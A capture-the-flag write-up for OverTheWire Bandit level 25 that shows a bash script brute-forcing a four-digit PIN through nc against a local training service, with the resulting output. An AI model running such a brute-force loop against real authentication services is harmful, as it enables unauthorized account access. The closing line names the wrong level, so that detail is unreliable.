# Problem Link
[Level Page](https://overthewire.org/wargames/bandit/bandit25.html)

# Solution
For this I needed to create a script to run a loop from pin 0000 until I find the correct pin, I created a new temporary directory to create the script:

```bash
bandit24@bandit:~$ cd $(mktemp -d)
bandit24@bandit:/tmp/tmp.trV9nHTcOw$ vi script.sh
```
In the end of the for loop, I piped the output of echo as an input to `nc` command, then I filtered the output using `grep -v "Wrong"` so the only correct password will be shown.

```bash
#!/bin/bash

for i in {0000..9999}
do
        echo "(password of bandit24) $i"
done | nc localhost 30002 | grep -v "Wrong"
```
Then I gave my script the permission to execute, then I executed it:

```bash
bandit24@bandit:/tmp/tmp.trV9nHTcOw$ chmod 777 script.sh
bandit24@bandit:/tmp/tmp.trV9nHTcOw$ ./script.sh                                                                                                                                           
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is (password of bandit25)
```
<details>
  <summary>Encrypted password:</summary>
  
  `U2FsdGVkX187TGeBDGr/ileb6aVLL352MnrggbxPic1U8V/OushouQo2noJ0ioAwlMMjAG3FVQIjI5hDbXI3eg==`
  
</details>

After saving the resulted password, log in to bandit23.



